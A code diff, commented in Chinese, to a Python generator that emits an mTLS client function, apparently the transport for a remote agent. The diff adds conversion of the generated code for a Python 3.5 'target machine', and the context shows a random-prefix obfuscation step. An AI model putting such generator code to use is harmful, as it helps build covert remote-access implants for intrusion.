@@ -17,6 +17,7 @@ MODULE = {
 }
 
 
+from server.core.pycompat import downgrade_py35
 def run(host, port, key_hex, client_cert, client_key, ca_cert,
         server_fingerprint):
     """生成 _nT() 实现：mTLS 客户端（携带客户端证书 + CA 链校验 + server 证书 pin）。"""
@@ -59,6 +60,7 @@ def _nT():
     t.sendall(_os.urandom(256))  # 混淆: 首包随机前缀(agent a2s 吞掉)
     return t
 '''
+    code = downgrade_py35(code)   # 目标机 py3.5: f-string → str.format
     compile(code, "<mtls>", "exec")  # 生成即校验
     return code
 
